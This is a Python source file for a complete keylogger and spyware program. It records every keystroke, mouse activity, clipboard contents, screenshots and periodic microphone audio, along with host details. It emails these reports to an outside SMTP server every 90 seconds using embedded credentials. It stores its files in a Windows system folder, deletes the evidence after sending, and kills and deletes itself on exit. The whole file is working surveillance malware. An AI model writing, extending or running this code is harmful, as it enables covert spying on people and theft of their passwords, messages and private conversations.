import logging
import os
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
import pyperclip
from pynput import keyboard
from pynput.keyboard import Listener
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import glob
import time
import tempfile
import math

# Set up logging
log_directory = "C:\\Windows\\klm\\logs"
os.makedirs(log_directory, exist_ok=True)
logging.basicConfig(filename=os.path.join(log_directory, 'keylogger.log'),
                    level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')

VERSION = "1.0.2"
EMAIL_ADDRESS = "071bfafc4dde91"
EMAIL_PASSWORD = "9918ecc6a25877"
SEND_REPORT_EVERY = 90  # as in seconds
MICROPHONE_INTERVAL = 4500  # 1 hour and 15 minutes in seconds
MICROPHONE_DURATION = 30  # 3 minutes in seconds
MAX_ATTACHMENT_SIZE = 7 * 1024 * 1024  # 7 MB
KLM_DIRECTORY = "C:\\Windows\\klm"

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password
        logging.info("KeyLogger initialized")

    def appendlog(self, string):
        self.log += string

    def on_move(self, x, y):
        current_move = "Mouse moved to {} {}\n".format(x, y)
        self.appendlog(current_move)

    def on_click(self, x, y, button, pressed):
        current_click = "Mouse clicked at {} {} with {}\n".format(x, y, button)
        self.appendlog(current_click)

    def on_scroll(self, x, y, dx, dy):
        current_scroll = "Mouse scrolled at {} {} with {}\n".format(x, y, dx, dy)
        self.appendlog(current_scroll)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        self.appendlog(current_key + "\n")

    def send_mail(self, email, password, subject, message, attachment_paths=None):
        try:
            msg = MIMEMultipart()
            msg['From'] = email
            msg['To'] = email
            msg['Subject'] = subject

            msg.attach(MIMEText(message, 'plain'))

            if attachment_paths:
                for attachment_path in attachment_paths:
                    if attachment_path and os.path.exists(attachment_path):
                        with open(attachment_path, "rb") as attachment:
                            part = MIMEBase('application', 'octet-stream')
                            part.set_payload(attachment.read())
                            encoders.encode_base64(part)
                            part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(attachment_path)}")
                            msg.attach(part)

            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                server.login(email, password)
                server.sendmail(email, email, msg.as_string())

            logging.info(f"Email sent successfully with subject: {subject}")

            # Delete the files after sending
            if attachment_paths:
                for attachment_path in attachment_paths:
                    if os.path.exists(attachment_path):
                        os.remove(attachment_path)

        except Exception as e:
            logging.error(f"Failed to send email: {e}")
            os._exit(1)

    def report(self):
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        self.appendlog("\nClipboard content: " + self.get_clipboard_content() + "\n")
        screenshot_path = self.screenshot()
        subject = f"Keylogger Report v{VERSION} - {timestamp}"
        self.send_mail(self.email, self.password, subject, "\n\n" + self.log, [screenshot_path])
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.daemon = True
        timer.start()

    def microphone_report(self):
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        audio_paths = self.microphone()
        for audio_path in audio_paths:
            subject = f"Microphone Recording v{VERSION} - {timestamp}"
            self.send_mail(self.email, self.password, subject, "Microphone recording", [audio_path])
        mic_timer = threading.Timer(MICROPHONE_INTERVAL, self.microphone_report)
        mic_timer.daemon = True
        mic_timer.start()

    def get_clipboard_content(self, max_retries=5):
        for i in range(max_retries):
            try:
                return pyperclip.paste()
            except pyperclip.PyperclipException as e:
                self.appendlog(f"Error accessing clipboard (attempt {i+1}): {e}\n")
                time.sleep(1)  # Wait a bit before retrying
        return "Could not access clipboard"

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog("Hostname: {}\n".format(hostname))
        self.appendlog("IP Address: {}\n".format(ip))
        self.appendlog("Processor: {}\n".format(plat))
        self.appendlog("System: {}\n".format(system))
        self.appendlog("Machine: {}\n".format(machine))

    def microphone(self):
        try:
            fs = 44100  # Sample rate
            seconds = MICROPHONE_DURATION  # Duration of recording
            audio_path = os.path.join(KLM_DIRECTORY, "audio_log.wav")

            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
            sd.wait()  # Wait until recording is finished

            # Save as WAV file
            with wave.open(audio_path, 'wb') as wf:
                wf.setnchannels(2)
                wf.setsampwidth(2)  # 2 bytes per sample
                wf.setframerate(fs)
                wf.writeframes(myrecording.tobytes())

            audio_size = os.path.getsize(audio_path)
            logging.info(f"Recorded audio size: {audio_size} bytes")
            if audio_size > MAX_ATTACHMENT_SIZE:
                logging.info("Splitting audio file due to size")
                return self.split_audio_file(audio_path)
            return [audio_path]
        except Exception as e:
            self.appendlog(f"Failed to record audio: {e}\n")
            logging.error(f"Failed to record audio: {e}")
            return []

    def split_audio_file(self, audio_path):
        chunks = []
        chunk_size = MAX_ATTACHMENT_SIZE - 1024 * 1024  # 6 MB
        with wave.open(audio_path, 'rb') as wf:
            params = wf.getparams()
            total_frames = wf.getnframes()
            frames_per_chunk = chunk_size // (params.sampwidth * params.nchannels)
            num_chunks = math.ceil(total_frames / frames_per_chunk)

            for i in range(num_chunks):
                chunk_path = os.path.join(KLM_DIRECTORY, f"audio_log_part_{i+1}.wav")
                with wave.open(chunk_path, 'wb') as chunk_wf:
                    chunk_wf.setparams(params)
                    frames = wf.readframes(frames_per_chunk)
                    chunk_wf.writeframes(frames)
                chunks.append(chunk_path)
                logging.info(f"Created audio chunk: {chunk_path} with size: {os.path.getsize(chunk_path)} bytes")
        os.remove(audio_path)  # Delete the original file after splitting
        return chunks

    def screenshot(self):
        try:
            img = pyscreenshot.grab()
            # Save screenshot in the user's temporary directory
            screenshot_path = os.path.join(KLM_DIRECTORY, "screenshot.png")
            img.save(screenshot_path)
            logging.info(f"Screenshot saved to {screenshot_path}")
            return screenshot_path
        except Exception as e:
            self.appendlog("Failed to take screenshot: {}\n".format(e))
            logging.error(f"Failed to take screenshot: {e}")
            return None

    def run(self):
        # Start the regular report timer
        self.report()

        # Start the microphone report timer
        self.microphone_report()

        # Start the keyboard listener
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            keyboard_listener.join()
        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            mouse_listener.join()
        if os.name == "nt":
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                print('File was closed.')
                os.system("DEL " + os.path.basename(__file__))
            except OSError:
                print('File is close.')
        else:
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system('pkill leafpad')
                os.system("chattr -i " + os.path.basename(__file__))
                print('File was closed.')
                os.system("rm -rf " + os.path.basename(__file__))
            except OSError:
                print('File is close.')

keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.run()
